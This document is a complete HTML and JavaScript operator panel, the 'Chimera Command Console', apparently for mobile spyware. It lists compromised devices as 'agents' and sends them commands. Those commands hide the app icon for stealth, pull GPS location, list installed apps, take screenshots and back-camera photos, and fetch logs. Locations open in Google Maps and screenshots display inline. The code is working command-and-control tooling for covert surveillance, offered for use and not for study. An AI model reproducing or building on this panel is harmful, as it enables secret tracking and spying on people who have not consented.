<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera Command Console</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-darkest: #010409;
            --bg-dark: #0d1117;
            --border-color: #21262d;
            --text-primary: #c9d1d9;
            --text-secondary: #8b949e;
            --accent-cyan: #39c5f7;
            --glow-cyan: rgba(57, 197, 247, 0.5);
            --success: #2ea043;
            --error: #f85149;
            --font-mono: 'Roboto Mono', monospace;
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-darkest);
            color: var(--text-primary);
            font-family: var(--font-mono);
            margin: 0;
            height: 100vh;
            overflow: hidden;
            background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 1px 2px;
        }
        .console-container {
            display: grid;
            grid-template-columns: 300px 1fr;
            height: 100vh;
        }

        /* --- Sidebar --- */
        .sidebar {
            background-color: var(--bg-dark);
            border-right: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            padding: 20px;
        }
        .sidebar-header {
            font-weight: 700;
            font-size: 1.5em;
            color: var(--accent-cyan);
            text-shadow: 0 0 8px var(--glow-cyan);
            margin-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 15px;
        }
        #device-list {
            list-style: none; padding: 0; margin: 0; overflow-y: auto;
        }
        #device-list li {
            padding: 12px 15px; border-radius: 6px; cursor: pointer;
            margin-bottom: 8px; word-break: break-all;
            transition: all 0.2s ease; border: 1px solid var(--border-color);
        }
        #device-list li:hover { background-color: var(--border-color); }
        #device-list li.selected {
            background-color: var(--accent-cyan); color: var(--bg-darkest);
            font-weight: 700; box-shadow: 0 0 12px var(--glow-cyan);
        }

        /* --- Main Content --- */
        .main-content {
            display: flex;
            flex-direction: column;
            height: 100vh;
        }
        .main-view {
            flex-grow: 1;
            padding: 25px;
            overflow-y: auto;
            position: relative;
        }
        .view-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 15px;
        }
        .view-title h2 { margin: 0; }
        .view-title button {
             padding: 8px 16px; background: none; border: 1px solid var(--border-color);
             color: var(--text-secondary); cursor: pointer; border-radius: 6px;
        }
        .view-title button:hover { background-color: var(--border-color); color: var(--text-primary); }

        .command-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 20px;
        }
        .command-group { padding: 15px; border: 1px solid var(--border-color); border-radius: 8px; }
        .command-group h3 { margin: 0 0 15px 0; font-size: 1.1em; }
        .command-group button {
            width: 100%; padding: 12px; margin-top: 10px;
            background-color: var(--bg-dark); border: 1px solid var(--border-color);
            color: var(--text-primary); border-radius: 6px; cursor: pointer; transition: all 0.2s ease;
        }
        .command-group button:hover:enabled { border-color: var(--accent-cyan); color: var(--accent-cyan); }
        .command-group button:disabled { cursor: not-allowed; opacity: 0.4; }

        /* --- Console --- */
        .console {
            flex-shrink: 0;
            height: 35%; /* Resizable */
            background-color: var(--bg-dark);
            border-top: 1px solid var(--border-color);
            padding: 15px;
            overflow-y: auto;
            resize: vertical;
        }
        .console-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .console-header h3 { margin: 0; color: var(--text-secondary); }
        #live-console-output { line-height: 1.7; }
        .log-entry { display: flex; }
        .log-entry .timestamp { color: var(--text-secondary); margin-right: 15px; white-space: nowrap; }
        .log-cmd { color: var(--accent-cyan); }
        .log-success { color: var(--success); }
        .log-error { color: var(--error); }
        .log-data .payload {
            background-color: var(--bg-darkest); border: 1px solid var(--border-color);
            padding: 10px; margin-top: 5px; border-radius: 6px;
            display: block; white-space: pre-wrap;
        }

        /* --- Data Viewer Specific --- */
        #data-viewer-content { max-width: 1000px; margin: 0 auto; }
        #data-viewer-content img { max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color); }
        #data-viewer-content a { color: var(--accent-cyan); text-decoration: none; font-size: 1.2em; }
        #data-viewer-content pre { background-color: var(--bg-dark); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; }

    </style>
</head>
<body>
    <div class="console-container">
        <aside class="sidebar">
            <div class="sidebar-header">AGENTS</div>
            <ul id="device-list"></ul>
        </aside>

        <main class="main-content">
            <div class="main-view" id="main-view">
                <!-- Content will be injected by JS -->
            </div>
            <div class="console" id="console">
                <div class="console-header">
                    <h3>LIVE CONSOLE</h3>
                    <button id="btnClearConsole">Clear</button>
                </div>
                <div id="live-console-output"></div>
            </div>
        </main>
    </div>

    <script>
        const deviceList = document.getElementById('device-list');
        const consoleOutput = document.getElementById('live-console-output');
        const mainView = document.getElementById('main-view');
        
        const API_BASE = '/.netlify/functions';
        let devices = [];
        let selectedDevice = null;

        const commandMatrixHTML = `
            <div class="view-title"><h2>Command Matrix</h2></div>
            <div class="command-grid">
                <div class="command-group"><h3>Stealth</h3><button id="btnHideIcon">Hide Icon</button><button id="btnShowIcon">Show Icon</button></div>
                <div class="command-group"><h3>Recon</h3><button id="btnGetLocation">Get Location</button><button id="btnListApps">List Apps</button></div>
                <div class="command-group"><h3>Surveillance</h3><button id="btnScreenshot">Take Screenshot</button><button id="btnTakePicture">Take Picture (Back)</button></div>
                <div class="command-group"><h3>Data</h3><button id="btnFetchData">Fetch All Logs</button></div>
            </div>`;

        function showCommandMatrix() {
            mainView.innerHTML = commandMatrixHTML;
            bindCommandButtons();
        }

        function showDataViewer(title, content) {
            mainView.innerHTML = `
                <div class="view-title">
                    <h2>${title}</h2>
                    <button id="backToCommands">Back to Commands</button>
                </div>
                <div id="data-viewer-content">${content}</div>`;
            document.getElementById('backToCommands').addEventListener('click', showCommandMatrix);
        }

        function logToConsole(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.classList.add('log-entry', `log-${type}`);
            logEntry.innerHTML = `<div class="timestamp">[${timestamp}]</div> <div class="message">${message}</div>`;
            consoleOutput.appendChild(logEntry);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }

        async function fetchDevices() {
            logToConsole('Querying for active agents...');
            try {
                const response = await fetch(`${API_BASE}/get-devices`);
                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                devices = await response.json();
                renderDeviceList();
                logToConsole(`Success: Found ${devices.length} agents.`, 'success');
                if (devices.length > 0) {
                    selectDevice(devices[0], deviceList.querySelector('li'));
                } else {
                    enableCommands(false);
                }
            } catch (error) { logToConsole(`Error fetching agents: ${error.message}`, 'error'); }
        }

        function renderDeviceList() {
            deviceList.innerHTML = '';
            devices.forEach(device => {
                const li = document.createElement('li');
                li.textContent = device.deviceId;
                li.onclick = () => selectDevice(device, li);
                deviceList.appendChild(li);
            });
        }

        function selectDevice(device, element) {
            if (!element) return;
            selectedDevice = device;
            document.querySelectorAll('#device-list li').forEach(li => li.classList.remove('selected'));
            element.classList.add('selected');
            logToConsole(`Target locked: ${device.deviceId}`, 'info');
            enableCommands(true);
            showCommandMatrix();
        }

        function enableCommands(enabled) {
            document.querySelectorAll('.command-group button').forEach(btn => btn.disabled = !enabled);
        }

        async function sendCommand(action, payload = {}) {
            if (!selectedDevice) return logToConsole('Cannot send command: No target selected.', 'error');
            const commandPayload = { token: selectedDevice.token, action, ...payload };
            logToConsole(`Sending command [${action}] to target...`, 'cmd');
            try {
                const response = await fetch(`${API_BASE}/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(commandPayload)
                });
                const result = await response.json();
                if (!response.ok) throw new Error(result.error || `Server responded with ${response.status}`);
                logToConsole(`Command [${action}] successfully transmitted. Awaiting data return...`, 'success');
                setTimeout(fetchDeviceData, 5000);
            } catch (error) { logToConsole(`Command transmission failed [${action}]: ${error.message}`, 'error'); }
        }
        
        async function fetchDeviceData() {
            if (!selectedDevice) return logToConsole('Cannot fetch data: No target selected.', 'error');
            logToConsole(`Querying server for new data from target...`, 'info');
             try {
                const response = await fetch(`${API_BASE}/get-device-data?deviceId=${selectedDevice.deviceId}`);
                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                const data = await response.json();
                if(data.length === 0) return logToConsole('No new data received.', 'info');
                
                logToConsole(`Received ${data.length} new data packets.`, 'success');
                let mostRecentFormattedItem = null;
                data.forEach(item => {
                    const dataPayload = JSON.stringify(item.payload, null, 2);
                    logToConsole(`[${item.dataType}]<div class="payload">${dataPayload}</div>`, 'data');
                    if (['location', 'screenshot', 'list_apps'].includes(item.dataType)) {
                        mostRecentFormattedItem = item;
                    }
                });
                if(mostRecentFormattedItem) renderFormattedData(mostRecentFormattedItem);
            } catch (error) { logToConsole(`Error fetching device data: ${error.message}`, 'error'); }
        }

        function renderFormattedData(item) {
            let title = `Data Received: ${item.dataType.toUpperCase()}`;
            let content = `<h3>Timestamp: ${new Date(item.timestamp).toLocaleString()}</h3>`;
            if (item.dataType === 'location') {
                const { latitude, longitude } = item.payload;
                content += `<a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Open Location on Google Maps</a>`;
                content += `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
            } else if (item.dataType === 'screenshot') {
                content += `<img src="data:image/jpeg;base64,${item.payload}" alt="Screenshot">`;
            } else {
                 content += `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
            }
            showDataViewer(title, content);
        }

        function bindCommandButtons() {
            document.getElementById('btnHideIcon')?.addEventListener('click', () => sendCommand('toggle_icon', { show: 'false' }));
            document.getElementById('btnShowIcon')?.addEventListener('click', () => sendCommand('toggle_icon', { show: 'true' }));
            document.getElementById('btnGetLocation')?.addEventListener('click', () => sendCommand('get_location'));
            document.getElementById('btnListApps')?.addEventListener('click', () => sendCommand('list_apps'));
            document.getElementById('btnScreenshot')?.addEventListener('click', () => sendCommand('screenshot'));
            document.getElementById('btnTakePicture')?.addEventListener('click', () => sendCommand('picture', { camera_id: '0' }));
            document.getElementById('btnFetchData')?.addEventListener('click', fetchDeviceData);
            enableCommands(selectedDevice !== null);
        }
        
        document.getElementById('btnClearConsole').addEventListener('click', () => {
            consoleOutput.innerHTML = '';
            logToConsole('Console cleared.');
        });
        
        window.onload = () => {
            logToConsole('Chimera Command Console Initialized.');
            showCommandMatrix();
            enableCommands(false);
            fetchDevices();
        };
    </script>
</body>
</html>
